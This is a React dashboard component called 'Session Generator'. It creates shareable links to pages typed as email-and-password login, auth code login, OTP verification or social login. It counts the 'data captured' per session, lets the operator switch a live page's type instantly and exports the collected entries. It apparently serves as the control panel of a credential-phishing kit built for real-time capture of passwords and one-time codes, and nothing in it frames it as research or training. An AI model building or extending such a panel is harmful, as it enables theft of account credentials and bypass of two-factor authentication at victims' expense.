
import React, { useState } from 'react';
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Label } from '@/components/ui/label';
import { toast } from '@/hooks/use-toast';
import { LinkIcon, Copy, RotateCw, Download } from 'lucide-react';
import { useSessionContext } from '@/contexts/SessionContext';

const Dashboard = () => {
  const { sessions, addSession, switchPageType, exportSessionData } = useSessionContext();
  const [pageType, setPageType] = useState('login1');
  
  const pageTypes = [
    { id: 'login1', name: 'Email & Password Login' },
    { id: 'login2', name: 'Auth Code Login' },
    { id: 'login3', name: 'OTP Verification' },
    { id: 'login4', name: 'Social Login' }
  ];
  
  const handleCreateSession = () => {
    addSession(pageType);
    toast({
      title: "New Session Created",
      description: `Session with ${getPageTypeName(pageType)} has been created.`
    });
  };
  
  const handleCopyLink = (link: string) => {
    navigator.clipboard.writeText(link);
    toast({
      title: "Link Copied",
      description: "Session link has been copied to clipboard."
    });
  };
  
  const handleSwitchPageType = (sessionId: string, newPageType: string) => {
    switchPageType(sessionId, newPageType);
    toast({
      title: "Page Type Changed",
      description: `Session page has been updated to ${getPageTypeName(newPageType)}.`
    });
  };
  
  const getPageTypeName = (type: string) => {
    const pageType = pageTypes.find(p => p.id === type);
    return pageType ? pageType.name : type;
  };

  return (
    <div className="container mx-auto animate-fade-in">
      <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-4 mb-8">
        <div>
          <h1 className="text-3xl font-bold">Session Generator</h1>
          <p className="text-muted-foreground">Create and manage your session links</p>
        </div>
        <div className="flex flex-col sm:flex-row gap-4">
          <div className="sm:w-64">
            <Label htmlFor="page-type" className="sr-only">Page Type</Label>
            <Select value={pageType} onValueChange={setPageType}>
              <SelectTrigger id="page-type">
                <SelectValue placeholder="Select Page Type" />
              </SelectTrigger>
              <SelectContent>
                {pageTypes.map((type) => (
                  <SelectItem key={type.id} value={type.id}>
                    {type.name}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <Button onClick={handleCreateSession}>
            Create Session
          </Button>
        </div>
      </div>
      
      <div className="mb-8">
        <h2 className="text-xl font-semibold mb-4">Current Sessions</h2>
        {sessions.length === 0 ? (
          <div className="bg-card rounded-lg p-8 text-center border">
            <div className="mb-4 text-muted-foreground">
              <LinkIcon className="h-12 w-12 mx-auto" />
            </div>
            <h3 className="text-lg font-medium mb-2">No active sessions</h3>
            <p className="text-muted-foreground mb-4">Create your first session to get started</p>
            <Button onClick={handleCreateSession}>Create Session</Button>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {sessions.map((session) => (
              <Card key={session.id} className="session-card">
                <CardHeader className="pb-3">
                  <div className="flex justify-between items-center">
                    <CardTitle className="text-lg">Session ID: {session.id}</CardTitle>
                    <Badge variant={getPageTypeBadgeVariant(session.pageType)} className={session.pageType === 'login1' ? 'bg-brand-purple' : ''}>
                      {getPageTypeName(session.pageType)}
                    </Badge>
                  </div>
                  <div className="mt-2 text-sm text-muted-foreground truncate">
                    <a 
                      href={`${window.location.origin}/page/${session.id}`} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="hover:underline"
                    >
                      {`${window.location.origin}/page/${session.id}`}
                    </a>
                  </div>
                </CardHeader>
                <CardContent className="pb-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-sm font-medium">Data captured:</div>
                      <div className="mt-1">
                        <Badge variant="outline">
                          {session.data.length} {session.data.length === 1 ? 'entry' : 'entries'}
                        </Badge>
                      </div>
                    </div>
                    <div>
                      <div className="text-sm font-medium">Page Type:</div>
                      <div className="mt-1">
                        <Select 
                          value={session.pageType} 
                          onValueChange={(value) => handleSwitchPageType(session.id, value)}
                        >
                          <SelectTrigger className="w-[130px] h-8 text-xs">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            {pageTypes.map((type) => (
                              <SelectItem key={type.id} value={type.id}>
                                {type.name}
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                    </div>
                  </div>
                </CardContent>
                <CardFooter className="pt-2 flex justify-between">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => handleCopyLink(`${window.location.origin}/page/${session.id}`)}
                  >
                    <Copy className="h-4 w-4 mr-2" /> Copy Link
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => exportSessionData(session.id)}
                    disabled={session.data.length === 0}
                  >
                    <Download className="h-4 w-4 mr-2" /> Export Data
                  </Button>
                </CardFooter>
              </Card>
            ))}
          </div>
        )}
      </div>
      
      <div className="bg-card rounded-lg p-6 border">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <h3 className="text-lg font-medium">Session Quick Guide</h3>
            <p className="text-muted-foreground max-w-2xl">
              Create a session, share the generated link, and collect data. You can change the page type at any time
              and the live session will update instantly. Export data when you're ready.
            </p>
          </div>
          <Button variant="outline" className="shrink-0" onClick={() => {
            toast({
              title: "Sessions Refreshed",
              description: "All sessions have been refreshed.",
            });
          }}>
            <RotateCw className="h-4 w-4 mr-2" /> Refresh Sessions
          </Button>
        </div>
      </div>
    </div>
  );
};

// Helper function to determine badge variant based on page type
function getPageTypeBadgeVariant(pageType: string): "default" | "outline" | "secondary" | "destructive" {
  switch (pageType) {
    case 'login1':
      return 'default';
    case 'login2':
      return 'outline';
    case 'login3':
      return 'secondary';
    case 'login4':
      return 'destructive';
    default:
      return 'outline';
  }
}

export default Dashboard;
